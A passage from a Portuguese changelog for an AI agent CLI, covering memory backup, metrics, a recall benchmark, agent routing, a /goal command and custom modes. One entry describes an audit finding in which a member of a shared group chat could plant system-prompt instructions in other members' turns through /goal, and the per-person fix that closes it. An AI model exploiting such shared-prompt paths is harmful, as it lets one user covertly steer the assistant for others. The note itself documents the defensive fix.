  nenhum — o vetor ja existe, so falta indexa-lo — e aparece como
  `index_repaired` no relatorio. Na mesma linha, `set_embedding` virou
  fail-closed: se o indice recusar o vetor, a coluna volta a NULL, para a
  entrada continuar na fila em vez de sair dela sem ter sido indexada.
- **`garra memory backup` — retrato consistente da memoria, com retencao (#955).**
  A memoria e o ativo que mais doi perder e vivia num arquivo so, sem copia. O
  comando escreve um retrato em `<data_dir>/backups/`, com nome ordenavel por
  data (`memory-20260906T054500123Z.db`, UTC com milissegundo).

  **`VACUUM INTO`, nao `cp`.** O banco roda em WAL: copiar o arquivo com `cp`
  pega uma foto sem as transacoes que ainda estao no `-wal` ao lado, e o
  resultado e um backup que parece bom e esta incompleto — o pior tipo. O
  `VACUUM INTO` le sob uma transacao e escreve o estado commitado inteiro, sem
  checkpoint e sem parar o gateway, e de brinde compacta.

  **O indice vetorial vai junto** — verificado, nao presumido: uma sonda contra
  um banco com `vec_embeddings_*` real confirmou que as tabelas vec0, as
  sombras delas e o `vec_id_map` chegam integros, e a copia reabre com o mesmo
  relatorio de integridade. Era o risco de verdade; o WAL, que a issue
  levantou, o `VACUUM INTO` ja resolve sozinho.

  `--keep-days N` apaga backups **nossos** mais velhos que N dias, depois de o
  novo existir. Duas garantias: so apaga arquivo que casa com o padrao que o
  proprio comando cria (backup manual com outro nome fica), e a idade vem do
  **nome**, nao do `mtime` — copiar o diretorio para outra maquina renova todo
  `mtime` e apagaria tudo na primeira execucao seguinte. Sem `--keep-days`,
  nada e apagado.

  Restauracao em `docs/src/memory-backup.md`, e o proprio comando imprime os
  quatro passos ao terminar, ja com os caminhos da instalacao. O passo que
  costuma ser esquecido — apagar o `-wal` antigo — esta em destaque nos dois:
  um `-wal` ao lado de um banco restaurado reintroduz exatamente o que se
  acabou de descartar.
- **O tamanho da memoria aparece no `/metrics` (#957, fecha a issue).** O #994
  entregou quatro metricas de **instrumentacao** — elas contam o que aconteceu
  quando aconteceu. Faltavam as de **estado**: quantas entradas existem agora e
  quantas estao no indice vetorial. Estado nao tem evento, entao alguem precisa
  ir olhar. Entram `garraia_memory_entries{has_embedding}` e
  `garraia_memory_vector_index_size`.
- **Os dois devem ser lidos juntos, e a distancia entre eles e o sinal.** Uma
  entrada com vetor na coluna mas fora do indice nao aparece na busca
  semantica. Isso era invisivel ate alguem rodar `garra memory stats` — que so
  mostra quando perguntam. Como gauge, vira tendencia, que e o que faz alguem
  pensar em perguntar. A consulta esta no `docs/telemetry.md`.
- **Worker proprio, e nao um braco do de retencao.** Era o caminho obvio, ja
  que existe um laco periodico tocando a memoria, e e errado por dois motivos
  independentes: o `memory_retention_worker` so sobe quando
  `memory.retention.enabled` e true, que nasce false porque apaga dado — os
  gauges ficariam mortos em quase toda instalacao; e a cadencia dele e de 24h,
  que nao mostra tendencia, mostra dois pontos por semana. Verificado no
  binario: com a retencao desligada (o padrao), o log diz que aquele worker nao
  subiu e os gauges estao servindo assim mesmo.
- **Leitura barata, e nao o relatorio de integridade.** O `integrity_report()`
  que alimenta o `garra memory stats` faz um `SELECT id FROM memory_entries`
  inteiro mais varredura de orfaos — trabalho justificado sob demanda,
  desperdicio a cada poucos minutos. O `gauge_snapshot()` novo sao tres
  `count(*)`, com as **mesmas** consultas, e ha teste cobrando que os dois
  concordem: dois numeros que deviam ser iguais e nao sao e o pior caso para
  quem esta diagnosticando.
- Falha de leitura nao derruba o laco: o proximo tick tenta de novo. Um gauge
  que para de atualizar em silencio e pior que um que some, porque o Prometheus
  continua servindo o ultimo valor e o painel mostra numero velho como atual.
- Achados da auditoria tratados antes do merge: a leitura solta o mutex do banco
  principal **antes** de consultar o vetorial (segurar os dois nao trava hoje,
  porque nenhum caminho adquire na ordem inversa, mas bloqueava recall e
  remember durante o tick e deixava a armadilha armada para o proximo caminho
  com locking invertido); contagem inconsistente (`com vetor > total`, que so
  acontece com corrupcao) passa a gritar em vez de publicar zero mudo; e entra
  `garraia_memory_gauge_errors_total`, porque um gauge que congela em silencio e
  pior que um que some — o Prometheus continua servindo o ultimo valor como se
  fosse atual.
- **A memoria passa a aparecer no `/metrics` (#957).** Ate aqui o `/metrics`
  tinha quatro metricas HTTP genericas e nada sobre o componente central do
  produto: o operador nao tinha como monitorar a saude do recall semantico.
  Entram quatro, com prefixo `garraia_` — nao `garra_` como a issue propoe,
  porque duas familias de prefixo no mesmo endpoint quebrariam todo dashboard
  que agrupa por `garraia_.*`: `garraia_memory_embed_latency_seconds`
  {provider,operation}, `garraia_memory_embed_failures_total`{provider,operation},
  `garraia_memory_recall_latency_seconds` e `garraia_memory_ingested_total`
  {outcome}. A que mais importa e a de falha: o #948 tirou a falha de embedding
  do silencio no log, e esta a tira do painel — log conta o caso, metrica conta
  a tendencia, e e a tendencia que faz alguem descobrir que o provider caiu
  antes de o recall degradar. `no_provider` e `failed` sao desfechos separados
  de proposito (a diferenca entre "ninguem configurou" e "configurou e esta
  quebrado"), e `noise` existe por causa do filtro do #952 — sem ele o total de
  entradas sem vetor subiria sem que ninguem distinguisse defeito de politica.
  Emitidas pelo facade `metrics` via `garraia-common`, e **nao** pelo
  `garraia-telemetry`: quem emite e o `garraia-agents`, que a CLI linka, e
  depender da telemetria arrastaria OpenTelemetry, OTLP, tonic e axum para
  dentro do binario da CLI. Sem recorder instalado cada chamada e um no-op.
  Toda label vem de conjunto fechado, com teste afirmando que id de sessao, id
  de usuario e conteudo nunca chegam a uma label.
- **`benches/recall_quality/` — benchmark de qualidade do recall em portugues
  (#958).** O benchmark que existia mede desempenho (tamanho de binario, RSS,
  cold start); este mede se a memoria devolve a lembranca **certa**:
  recall@k, precision@k e MRR sobre 40 consultas com ground truth, em 13
  grupos que separam tipos de falha (parafrase, sinonimo, consulta de uma
  palavra, consulta em espanhol contra corpus em portugues).
- **`ruido@k` para consulta que nao deve casar com nada.** E o que a issue pede
  sem nomear: ela relata que "quem e Michel" devolveu "oi" no top-K. Um
  benchmark que so mede acerto daria nota cheia a um sistema que devolve tudo
  para tudo, entao o grupo `ruido-puro` tem ground truth vazio e e pontuado
  numa escala separada, onde menor e melhor. As consultas desse grupo perguntam
  por assuntos que o corpus nao tem, e o `run.sh` recusa o dataset se alguma
  delas usar palavra que aparece no corpus — sem isso a sonda mediria acerto
  como se fosse ruido. As saudacoes seguem entre os **documentos**, que e onde
  importam: como distratoras das consultas de verdade.
- **`garra memory add` novo.** O `garra memory` sabia inspecionar (`list`,
  `search`, `stats`) e podar (`delete`, `compact`, `ttl`), mas nao **semear**:
  a unica forma de por algo na memoria era conversar com o agente, o que exige
  um provider de LLM. Sem isso nao havia como medir recall de forma
  reproduzivel. O embedding e gerado na hora — uma entrada sem vetor nao
  aparece na busca semantica, e um comando de semear que deixa a entrada
  invisivel ate um segundo comando e uma armadilha. Quando nao ha provider, ele
  **diz** e aponta o `reindex`.
- **Nao e gate de CI, e nao deve virar um.** A execucao depende de um provider
  de embeddings, e um numero que varia com a maquina e com o modelo instalado
  nao pode reprovar o PR de ninguem.
- **Primeira medida, commitada como artefato:** MRR 0,108 na **busca textual**
  (sem provider configurado). O que o numero diz nao e "a memoria e ruim" — e
  que o fallback textual e quase inutil para pergunta em linguagem natural.
  `recall@1` igual a `recall@10` e a assinatura: a busca e
  `LIKE '%frase inteira%'`, entao ou a frase casa ou nao casa. As quatro
  consultas que acertaram, das 37 com resposta esperada, sao exatamente aquelas
  cuja string aparece **literal** no documento — nao as mais curtas.
- **Memoria do agente ganha prazo de validade e fixacao (#959).** A memoria de
  workspace (`rest_v1/memory.rs`) ja tinha `ttl_expires_at` e `pinned_at`; a
  memoria que alimenta o recall semantico nao tinha nenhum dos dois — memoria
  obsoleta (preferencia que mudou, fato de sessao antiga) ficava para sempre
  poluindo o recall, e nao havia como proteger da compactacao o que importava.
  Agora `memory_entries` tem as duas colunas (migracao aditiva, forward-only:
  banco existente ganha as colunas na abertura) e a CLI tem
  `garra memory pin <id> [--unpin]` e `garra memory ttl <id> <dias|--clear>`.
  Entrada vencida sai do recall **na hora**, pelo caminho textual e pelo KNN —
  o indice vec0 so conhece distancia, entao o filtro tambem foi para o fetch
  dos candidatos, como o #971 teve de fazer para tenant. Entrada fixada nunca e
  apagada pela compactacao, automatica ou manual. `garra memory stats` conta as
  fixadas e as vencidas.
- **`POST /a2a/tasks` passa a rotear para um agente nomeado (#965).** O corpo
  aceita `target` (e as grafias `agentId` e `agent_id`, que a issue cita) para
  escolher entre os agentes que o operador configurou. Sem o campo, nada muda:
  o agente padrao atende como sempre atendeu, e nenhum cliente A2A existente
  quebra.
- **Um alvo desconhecido e recusado com 400, e nunca cai no padrao em
  silencio.** O `agent_router::resolve` cai — e esta certo, porque ele existe
  para escolher quando ninguem escolheu. Mas quem pede a Hera e recebe a Garra
  com 200 e sem sinal nenhum acredita ter falado com quem nao falou; e a mesma
  forma do `/mode` decorativo que este lote inteiro vem eliminando. Entrou um
  `resolve_exact` que devolve ausencia, e o teste poe os dois lado a lado na
  mesma entrada para o contraste ficar no CI.
- **A resposta 400 lista os nomes conhecidos.** Nao vaza nada: o
  `GET /.well-known/agent.json` ja publica todos como `skills`. Sem a lista, o
  chamador so poderia adivinhar.
- **O nome pedido nao entra no log.** Ele vem de um endpoint sem
  autenticacao, e ecoar entrada de fora para o arquivo de log e o caminho
  curto para poluicao e injecao de linha.
- **O `tools:` de um agente nomeado passa a valer — ele nunca valeu.** A config
  documenta o campo como "Restrict which tools this agent can use (empty = all
  tools)" e nenhum codigo o lia: nem aqui, nem no `POST /api/chat`, que ja
  aceitava `agent_id`. Quem escrevia `tools = ["web_search"]` acreditava ter
  restringido e o agente seguia com todas. E a mesma forma da #988, e o
  conserto entra **aqui** porque este PR abre o caminho dos agentes nomeados
  para um endpoint sem autenticacao — uma restricao que nao vale e pior num
  lugar onde qualquer um chega. Lista vazia continua significando "todas".
- **E o `model:` do agente tambem era ignorado.** Um agente configurado com
  `model = "gpt-4"` respondia pelo modelo padrao do provider.
- **Fragmentos de changelog em `changelog.d/` (#973).** Todo par de PRs
  paralelos colidia na secao `[Unreleased]` do `CHANGELOG.md` — duas vezes so
  na sessao de 2026-09-05, e numa delas as entradas foram parar dentro da
  versao ja publicada porque o contexto do hunk sobreviveu ao rename da secao.
  A causa e estrutural: dois PRs que anexam linhas na mesma secao do mesmo
  arquivo conflitam sempre. Agora cada PR deixa um arquivo proprio em
  `changelog.d/<secao>/<numero>-<slug>.md`, e `scripts/changelog/assemble.py`
  junta tudo no passo de release — respeitando secao existente e nunca
  escrevendo dentro de uma versao ja publicada.
- **O timeout por execucao de ferramenta virou configuravel (#981).** Eram 30s
  fixos em `ExecutionBudget::padrao()`, e isso matava ferramenta que chama LLM
  por dentro: um MCP que sumariza, um `ask` aninhado, geracao de resposta
  longa. O agente recebia `tool timeout` como se fosse falha da ferramenta — o
  erro apontava para o lugar errado. Agora `GARRA_TOOL_TIMEOUT_SECS` sobrescreve,
  e o default segue 30s (zero mudanca para quem nao configurar).
- **Valor invalido avisa em vez de sumir.** `=abc` ou `=0` volta ao padrao **e
  loga**. Cair no padrao em silencio faria alguem configurar, ver o
  comportamento antigo e nao ter como saber por que.
- **Valor absurdo e aceito, com aviso.** Acima de uma hora por ferramenta o log
  diz que, se a intencao era milissegundos, o numero esta 1000x maior — mas
  usa o que foi pedido. Quem quer mesmo um turno longo tem direito ao numero
  dele; quem digitou `30000` querendo `30` descobre antes de esperar 8 horas.
- **E variavel de ambiente, e nao chave de config, por um motivo concreto:** o
  `garraia-agents` nao depende do `garraia-config`, e criar essa dependencia so
  para um `u64` acoplaria o crate de agentes ao carregador inteiro. O preco
  seria o knob nascer invisivel — pago em separado: `garra config check` agora
  lista `GARRA_TOOL_TIMEOUT_SECS` entre as env vars detectadas, entao o
  operador descobre sem ler codigo.
- **`/goal` existe de verdade (#983).** `/goal <texto>` define o objetivo da
  sessao, `/goal` consulta, `/goal clear` remove. O objetivo persiste entre
  mensagens e entre reinicios, e nao vaza entre sessoes.
- **O runtime recebe o objetivo explicitamente**, num campo do `ExecContext`, e
  nao concatenado na mensagem — que e o que o criterio de aceite pede. A
  diferenca e pratica: concatenado na mensagem, o objetivo sumiria da janela
  junto com ela quando o historico fosse podado. Como enquadramento do turno,
  ele entra no prompt de sistema e fica.
- **O objetivo e por pessoa, e nao por sessao — e isso e seguranca, nao
  preferencia.** Achado ALTO de auditoria: em grupo do Telegram ou do iMessage a
  chave da sessao e do **canal** (`external_id = chat_id`), entao todos os
  membros compartilham uma sessao. Como o objetivo entra no prompt de
  **sistema**, um objetivo por sessao deixaria qualquer membro escrever
  instrucao de sistema para os turnos dos outros — com um comando `Role::User`,
  sem eles saberem. Em conversa de um para um nada muda: a sessao tem uma pessoa
  so. Objetivo compartilhado de time e outra funcionalidade, e precisaria de
  permissao explicita para quem define.
- **O texto tem teto de 2000 caracteres, e passar disso e recusa e nao
  truncamento.** O objetivo volta no prompt de sistema de **todo** turno
  seguinte, entao um `/goal` de 10 MB seria custo de token recorrente — e, em
  canal de grupo, um membro escolheria esse custo para o canal inteiro.
- O objetivo mora no mesmo metadado de sessao que o modo. Isso so e seguro desde
  a correcao do upsert (#1008): antes, a gravacao do turno substituia a coluna
  inteira, entao gravar objetivo ali seria gravar e perder no mesmo turno —
  exatamente o que acontecia com o `/mode`. Ha teste para os dois convivendo.
- **Modo customizado passa a valer na execucao (#986).** O CRUD existe desde o
  GAR-232 — `POST/GET/PATCH /api/modes/custom`, com UI no WebChat — e o runtime
  nunca leu nada dele: dava para criar um modo, tentar seleciona-lo, tomar 400 do
  `POST /api/mode/select` (que so aceitava os nove nativos), e, se conseguisse
  gravar por outro caminho, ver a execucao ignorar tudo. Agora o `base_mode`, o
  `prompt_override`, os `tool_policy_overrides` e os `defaults` formam um perfil
  efetivo que chega ao portao de ferramentas.
- **As duas grafias do override de politica sao aceitas.** O `README.pt-BR.md`
  documenta `{"allow": [...], "deny": [...]}` e a struct chama os campos
  `allowed`/`denied`. Quem seguiu a documentacao publicada nao pode ver o
  override ser ignorado em silencio. Chave ausente preserva a do perfil base;
  presente substitui — nao ha merge de listas, porque quem declara `allow` esta
  dizendo qual e a lista, e nao acrescentando a ela.
- **O `prompt_override` e o `defaults` chegam ao modelo.** Achado de auditoria:
  na primeira versao os dois eram gravados, devolvidos pela API e **nunca lidos
  na execucao** — o perfil os carregava e nada extraia dali. O criterio de aceite
  da issue ("overrides de politica, prompt e defaults sao respeitados") nao
  estava cumprido, e o teste que eu tinha escrito verificava so o struct, entao
  passava com a feature morta. Precedencia: override explicito do chamador >
  valor do modo > config do runtime > default. Diferente dos `ModeLimits`, o
  `max_tokens` do modo **nao** e limitado ao padrao: aquele limita quantas vezes
  o agente roda ferramenta (cada uma podendo rodar `bash`) e o tempo de parede
  junto; este limita o tamanho de uma resposta, e o README documenta `8192` como
  uso pretendido. Quem configurou `max_tokens` no runtime continua vencendo.
- **Nome de modo nativo e recusado na criacao.** `select_mode` tenta o nativo
  primeiro — e tem de tentar, para um customizado chamado `code` nao sequestrar
  o nativo. A consequencia era que um modo criado com nome nativo ficava gravado
  e nunca selecionavel. Aceitar a criacao e negar a selecao depois e o pior dos
  dois.
- **`GET /api/modes` passa a listar os customizados**, com a `tool_policy`
  **efetiva** e nao a do modo base. A mensagem de erro do `select` mandava
  conferir uma lista que nunca continha o modo recem-criado.
- **Um lugar so monta o `ExecContext`.** Os dez pontos que atendem usuario
  chamavam `ExecContext::with_mode(state.chosen_agent_mode_for(..).await)` cada
  um por si; agora chamam `state.exec_context_for(..)`, que resolve o modo e, se
  for customizado, ja traz o perfil. E a mesma razao de o `chosen_agent_mode_for`
  existir: foi a repeticao que deixou o `/mode` gravando numa chave e a execucao
  lendo outra por meses.

- **Wrapper `garra-mcp-server-linker` no Termux (#920).** "O exec falha no
  Termux" sao na verdade duas falhas com o mesmo sintoma: (A) o host MCP nao
  consegue exec'ar o wrapper *script*, e (B) o wrapper roda e o exec interno do
  ELF falha. O `LD_PRELOAD` da v0.3.7 cobre B — e so quando o shim esta
  instalado. O wrapper novo entrega o ELF ao loader do Android
  (`/system/bin/linker64`, com fallback no caminho do apex), que mapeia o
  binario sem shim e sem `LD_PRELOAD` nenhum.

  **A nao tem solucao dentro de um wrapper**, porque o wrapper tambem precisa
  ser exec'ado, e o CHANGELOG nao finge que tem: para A o host aponta
  `command: /system/bin/linker64` e passa o binario como argumento — a config
  que o relator validou fim a fim com `env -i`. Documentada em
  `docs/installation.md` e `docs/cli-mcp-server.md`, e impressa pelo
  `garraia doctor` com o caminho real preenchido.

  Arquivo separado do wrapper existente por decisao de teste: a suite afirma
  `grep -c '^exec '` == 1 em cada um, o que faz uma futura fusao dos dois
  derrubar os testes em vez de apagar o fallback em silencio.
  `detect_platform.sh` 21 -> 28 casos.
- **Bloco Termux do `doctor` ganha "Wrapper MCP (loader)" (#920)**, com a
  receita do `linker64` pronta para colar. `TermuxItem.next_step` passa de
  `&'static str` para `String` para poder nomear o caminho real; a forma
  serializada de `doctor --json` nao muda.
- **Tool `telegram_send` de envio proativo (#921).** O agente pode *iniciar*
  uma mensagem no Telegram (lembrete agendado, "o backup terminou", resposta
  de tarefa longa) em vez de so responder. Deny-by-default: responder no chat
  corrente nao pede config; mandar para um chat que o modelo *nomeia* exige o
  id em `channels.telegram.proactive_chat_ids` — lista separada de proposito
  do allowlist de usuarios (que tem modo `open`, perigoso demais para decidir
  quem o bot pode procurar sozinho). Vazia = recusa tudo; lida a cada envio
  (revogacao sem restart). Rate limit de 5 mensagens/conversa/minuto
  (`SendBudget`); recusa nao consome cota. Documentada em `docs/channels.md`.

  De quebra, a investigacao achou que **a entrega Telegram de tarefas
  agendadas estava silenciosamente quebrada** — nada no repo escrevia
  `telegram_chat_id` no metadata que `Channel::send_message` exige — e o
  mesmo caminho novo de enderecamento (`ProactiveTargets`/
  `with_channel_address`) conserta os heartbeats.
- **Persona: o Garra conhece a Hera e a Forja (#966).** Port do plan 0274
  adaptado ao `agent_router`/`NamedAgentConfig`; a persona explica que a
  conversa direta entre agentes ainda nao esta disponivel (issue #965).
  `docs/configuration.md` corrige o exemplo de `agents:` para o formato real
  e `docs/hera-persona.md` entra na doc.

### Changed

- **Quatro testes de KNN deixam de passar em vazio (divida da auditoria do
  #971).** Eles faziam `return` silencioso quando o sqlite-vec nao carregava —
  inclusive os dois de isolamento de tenant, que assim jamais exercitariam o
  caminho que existem para proteger. Agora afirmam `knn_enabled()`: o
  sqlite-vec e compilado no binario (`rusqlite` com `bundled`), entao ausencia
  dele e defeito de build, nao ambiente aceitavel.
- **O console interativo fica limpo por default (#933).** O subscriber unico
  escrevia o mesmo fluxo em `garraia.log` e no stderr, entao todo INFO de
  registro de provider/tools/sessao competia com o spinner e com a resposta
  streamada do chat. Agora sao dois layers com filtros independentes: o
  arquivo segue com tudo no nivel pedido (`--log-level`, elevado por
  `--debug`) e o stderr mostra so WARN+ — `--verbose` (flag global nova) traz
  o INFO operacional conciso e `--debug` espelha o arquivo. `RUST_LOG` setado
  e valido continua vencendo os dois lados, como sempre (GAR-138). A redacao
  (regra absoluta 6) permanece nos dois caminhos, com teste que varre o fonte
  para impedir a regressao de redigir so uma metade.

  Ficam **fora** do console limpo, por serem canal de log e nao console:
  `start`/`restart` (journald le o stderr do foreground) e `mcp-server` (o
  host MCP loga o stderr do filho — `docs/cli-mcp-server.md` §Stdio
  invariants). Esses espelham o arquivo como antes.
- **O indicador de atividade ganha janela de aparicao e cronometro (#936).**
  Resposta quase instantanea nao pisca mais spinner nenhum: os primeiros
  ~270ms (3 ticks de 90ms) avancam o estado sem pintar nada, entao nao ha
  flash a limpar. Espera longa ganha o tempo decorrido na linha (`4.7s`, a
  partir de ~2,5s, junto da primeira rotacao de mensagem). As mensagens
  passam a intercalar 3 profissionais para 1 com a personalidade do Garra
  (exatamente as quatro que a issue cita), com teste fixando razao e
  espacamento. Tudo derivado de **ticks**, nunca de relogio — o
  `SpinnerState` continua puro, renderizado como braco do `tokio::select!`
  (nunca task propria), cursor nunca escondido, fallback ASCII cobrindo
  quadro, texto e cronometro. Os testes de timing do chat migram para tempo
  virtual (`start_paused`) porque a janela de aparicao tornaria margens de
  30ms flake garantido em runner carregado.
- **O lote de embeddings do Ollama passa a ser paralelo.** O endpoint dele e
  um-texto-por-request e o loop era serial: reindexar as ~7k entradas de uma
  base real seriam 7k idas e voltas encadeadas. Agora sao lotes de 4, com
  teste garantindo que a saida mantem a ordem dos textos de entrada —
  embaralhar ali corromperia a memoria em silencio, porque o chamador casa
  vetor com texto por indice.
- **O chat ganha layout de conversa e cabecalho compacto (#934, #935).**
  `voce >` virou `❯` e `garra > ` virou um rotulo `Garra` em linha propria —
  o rotulo na mesma linha da resposta so identificava o primeiro paragrafo.
  A abertura deixou de gastar doze linhas com o mascote mais `Diretorio:` e
  `Projeto: Arquivos: a, b, c...`: agora sao tres linhas com versao, modelo,
  modo, caminho encurtado, ramo do git e tipo de projeto. O mascote nao
  sumiu, virou `garra about`; a inspecao detalhada de diretorio virou
  `/context`; e a listagem de arquivos, que ninguem lia na tela, continua
  indo para o prompt do sistema, onde serve para alguma coisa. O ramo do git
  sai do `.git/HEAD` sem subprocesso, seguindo o ponteiro `gitdir:` de
  worktree e submodulo. Novo modulo `conversation.rs`, puro no molde do
  `spinner` (nao escreve no terminal nem le o relogio), o que torna
  afirmavel o que ninguem exercita a mao: o caminho ASCII, o sem cor e o
  terminal estreito.
- **O resumo de ferramenta passa a dizer o resultado, e nao a primeira linha
  (#938).** Ate aqui `cargo test` aparecia como `Compiling garraia-agents
  v0.3.9 (+104 linha(s))` — a primeira linha nao-vazia, que nao diz nada sobre
  ter passado. Agora aparece `85 passou`, e um `cargo test --workspace` soma os
  binarios (uma linha `test result:` por alvo; "148 passou" espalhado em 54
  linhas nao e resposta). Em falha, `3 falhou, 145 passou`, com a falha na
  frente porque e ela que muda o que a pessoa faz em seguida.
- **Em erro de compilacao o resumo e o proprio erro.** `error[E0382]: borrow of
  moved value` em vez de `Compiling ...`, que era o que a issue pedia como
  "concise relevant excerpt". Mais de um erro mostra o primeiro e diz quantos
  faltam.
- **A classificacao olha a forma da saida, nao o comando.** A mesma contagem
  sai de `cargo test`, `cargo nextest` e de um `make test` que embrulhe
  qualquer um dos dois — e o comando nem chega ate a funcao de resumo. Formato
  sem caso escrito continua no comportamento generico: nao se adivinha, pela
  mesma razao que o resumo do **input** nao adivinha campo (adivinhar foi como
  ele chegou a exibir connection string).
- **Sanear vem antes de classificar.** Saida de terminal costuma vir colorida,
  e um reconhecedor rodando no texto cru procuraria `test result:` numa linha
  que comeca com escape ANSI. O caso comum falharia em silencio, caindo no
  resumo generico sem nada indicando por que.
- **Erro no `garra chat` passa a dizer o que fazer (#941).** O #933 tirou o
  tracing do console, e isso criou uma divida: silenciar o log de rotina nao
  pode significar esconder a falha. Ate aqui saia `Erro: {mensagem crua do
  provedor}` e, para dois casos, uma dica escolhida por `err_str.contains(...)`
  solto no meio do laco do chat. Agora sai um cartao com o componente que
  falhou no titulo, a mensagem redigida no corpo e o proximo passo embaixo —
  oito classes (credencial, timeout, inalcancavel, modelo indisponivel, limite
  de taxa, permissao, provedor local fora do ar, desconhecida) em vez de duas.
- **Nao reconhecer nunca perde informacao.** Classe desconhecida cai num cartao
  generico que mostra a mensagem original **inteira**, e sem acao inventada.
  Trocar um erro feio por um erro invisivel seria pior, e ha teste afirmando
  isso.
- **Provedor local tem conserto proprio.** "Verifique a rede" para quem
  esqueceu de subir o Ollama e mandar investigar a coisa errada; o cartao
  sugere `ollama serve`. Rodar o binario contra um Ollama desligado mostrou que
  a frase real do `reqwest` e "error sending request for url" — que nao contem
  "connect" nem "refused", entao a lista de padroes escrita de cabeca perdia
  justamente o caso mais comum do projeto. O codigo antigo tambem o perdia.
- **Segredo nunca aparece no cartao.** Criterio de aceite da issue, e nao
  teorico: mensagem de erro de provedor e corpo de resposta HTTP, e ha provedor
  que ecoa o pedido com o `Authorization` dentro. O texto passa por
  `redact_secrets` e pelo filtro de controle do #996 — na origem **e** no
  renderer, porque confiar so na origem deixaria um jeito de errar para quem
  montar um cartao a mao.
- **A variante `UiEvent::Error` de uma linha saiu.** Depois do cartao ela nao
  tinha mais caso proprio: um erro sem proximo passo e um cartao de acoes
  vazias, e ganha do texto solto por nomear o componente. O aviso do `/model`
  migrou do `println!` com cor incondicional para o renderer, entao passou a
  respeitar `NO_COLOR` e pipe — uma linha a menos da divida que o plano de
  migracao da ADR 0017 registra.
- **A saida do terminal passa por um renderer, nao mais por `println!` espalhado
  (#942).** Ate aqui tres donos que nao se conheciam montavam a tela do
  `garra chat`: `println!` direto, o `stream_turn` e o `tracing` — e a separacao
  entre log e interface, que o #933 conquistou, era convencao, nao estrutura.
  Agora ha `UiEvent` (o que aconteceu) e `TerminalRenderer` (o que aparece),
  conforme a ADR 0017. A ordem obrigatoria de escrita — apagar a animacao,
  escrever o rotulo `Garra` uma unica vez, so entao o texto do modelo — saiu de
  uma macro dentro do `stream_turn` e virou responsabilidade do renderer. O
  `spinner` e o `conversation` viraram `ui::spinner` e `ui::conversation`, sem
  alteracao propria. Comportamento visivel identico, com uma excecao de
  proposito: num terminal interativo sem UTF-8 (`LANG=C`), a conversa e a
  animacao agora caem para ASCII **juntas**. Antes cada uma decidia sozinha e o
  usuario via `❯` em UTF-8 ao lado de uma animacao ASCII — o desencontro que a
  ADR 0017 manda acabar. `GARRAIA_NO_SPINNER` passou a desligar so a animacao,
  mantendo o resto da interface rica de pe. A largura do terminal tambem virou
  fonte unica: pergunta ao terminal primeiro, `COLUMNS` como segunda opiniao.
- **A ADR 0002 passa a dizer o que foi construido (#949).** Ela decidia
  "pgvector, 768 dimensoes fixas, mxbai" e ninguem voltou nela quando a memoria
  do agente foi construida em **sqlite-vec**, com uma tabela `vec_embeddings_{dims}`
  por dimensao, criada sob demanda a partir do vetor que o provider devolve.
  Quem lia o ADR de cima a baixo acreditava num sistema que nao existe em
  instalacao nenhuma. A Amendment de 2026-09-06 registra a divergencia campo a
  campo, explica por que ela aconteceu (memoria do agente e local-first e
  mono-usuario; exigir Postgres teria matado o caso de uso principal) e delimita
  o que do ADR continua valendo — tudo que ele decide para o workspace
  multi-tenant em Postgres. O status segue `Accepted`: o documento nao estava
  errado, estava sem escopo. O crate orfao `garraia-embeddings` ganha um aviso
  no topo dizendo que **nao** e o caminho em uso e apontando para o par que e
  (`garraia_agents::embeddings` + `garraia_db::vector_store`). Remover ou alinhar
  o crate fica como decisao propria, com ADR, porque o `CLAUDE.md` o registra
  como scaffold deliberado da Fase 2.1.
- **O crate `garraia-embeddings` passa a avisar no compilador que e orfao
  (#949).** Ele nao e usado por nada no workspace e descreve um sistema que nao
  roda: pgvector com 768 dimensoes fixas, quando o caminho vivo e
  `garraia_agents::embeddings` + `garraia_db::vector_store` (sqlite-vec, com a
  dimensao derivada do vetor que o provider devolve). O aviso deixou de ser so
  um comentario no `lib.rs` e virou `#![deprecated]`: como o CI roda
  `clippy -D warnings`, um `use garraia_embeddings::...` novo **quebra o
  build** em vez de passar despercebido.
- **A `EMBEDDING_DIM = 768` casa por acaso com o modelo padrao de hoje**
  (`nomic-embed-text`), e e por isso que ela engana: a constante parece certa
  enquanto a afirmacao que ela faz — "o sistema tem uma dimensao, e e esta" — e
  falsa. Trocar o numero consertaria o valor e manteria o erro.
- **A decisao de remover ou alinhar o crate esta na ADR 0018, com status
  `Proposed`** — a regra absoluta 8 pede o ADR antes da decisao, e a decisao e
  do dono. Nada foi removido.
- **O `docs/src/memory.md` passa a descrever o sistema que existe (#963).** A
  pagina documentava um produto que nunca foi construido: `garra memory
  add/clear/export/disable`, um `facts.json` com array de fatos datados, e as
  chaves `memory.auto_extract`, `extraction_interval` e `max_facts`. Nenhum
  desses comandos existe; nenhuma dessas chaves e lida. Quem seguisse a pagina
  batia num `error: unrecognized subcommand` e concluia que o produto estava
  quebrado — documentacao errada e pior que documentacao ausente, porque a
  ausente manda a pessoa ler o `--help`.
- Agora estao la os nove subcomandos reais (`stats`, `list`, `search`,
  `reindex`, `backup`, `pin`, `ttl`, `delete`, `compact`), as chaves reais
  (`memory.ingestion.*`, `memory.retention.*`, `embeddings.<nome>`), e as
  quatro metricas do #957. Cada afirmacao foi conferida contra o codigo e
  contra o binario — a tabela de comandos bate com o `garra memory --help`, e a
  frase "diz se rodou semantica ou textual" foi verificada rodando a busca.
- Registra tambem o que **nao** existe, que e metade do valor: nao ha `garra
  memory add`; o retriever do `garraia-learning` segue stub ate a Fase 2.1; e
  os dois gauges de tamanho do indice da #957 ainda nao foram entregues, com o
  motivo (precisam de worker proprio, porque pendura-los no worker de retencao
  os deixaria mortos para quem nao liga a retencao — que e o padrao).
- Esclarece uma confusao que a pagina antiga criava: `fatos.json` existe, mas
  e um **perfil estatico** escrito a mao e injetado no boot, e nao onde os
  fatos extraidos ficam. Os fatos extraidos por LLM (confianca >= 0,80) moram
  no mesmo `memory.db`, como entradas `[FACT]`, e nao passam pelo filtro de
  ruido — um fato extraido e, por definicao, o que o extrator julgou ser sinal.
- **`/mode auto` passa a restringir de verdade (#979).** Ate aqui escolher
  `auto` resolvia para um perfil de politica vazia — ou seja, nao mudava nada.
  Agora o perfil do turno sai da classificacao da mensagem: "escreve uma funcao
  que soma" ganha permissao de escrita, "onde fica o handler de login" roda
  somente-leitura. A linha que isto **nao** cruza e a do #988: deduzir para quem
  escolheu `auto` e executar a escolha; deduzir para quem nao escolheu nada
  continua sem ligar politica nenhuma.
- **O classificador entende portugues.** As listas de palavra-chave eram so em
  ingles. Enquanto o modo era decoracao de prompt, um classificador que nunca
  dispara para "implementar o parser de config" era so inerte; com a politica
